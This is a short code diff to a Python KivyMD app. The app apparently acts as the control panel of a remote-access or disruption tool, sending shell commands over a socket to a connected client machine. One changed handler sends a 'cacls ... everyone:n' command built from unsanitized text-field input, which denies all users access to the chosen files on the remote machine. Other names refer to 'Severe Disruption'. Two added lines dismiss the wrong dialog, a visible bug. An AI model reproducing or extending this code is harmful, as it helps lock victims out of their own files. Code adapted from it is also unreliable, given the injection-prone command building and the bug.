@@ -449,18 +449,21 @@ class Main(MDApp):
                     ),
                 ],
             )
+
+        self.denyFilesDialog.open()
         
     def DismissDenyFilesDialog(self, *args):
         self.denyFilesDialog.dismiss(force=True)
 
     def ExecuteDenyFiles(self):
         while True:
-            command = 'cacls "C:\\Users\\%USERNAME%\\Desktop\\"' + self.denyFilesDialog.content_cls.ids.denyFilesID.text + ' /E /P everyone:n'
+            command = 'cacls ' + self.denyFilesDialog.content_cls.ids.denyFilesID.text + ' /E /P everyone:n'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
+            self.killTaskDialog.dismiss(force=True)
             break
 
     # Juls Severe Disruption
@@ -536,6 +539,7 @@ class Main(MDApp):
             output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
             self.root.ids.consoleField.text = output
+            self.killTaskDialog.dismiss(force=True)
             break
 
     def DisruptionMenu(self):
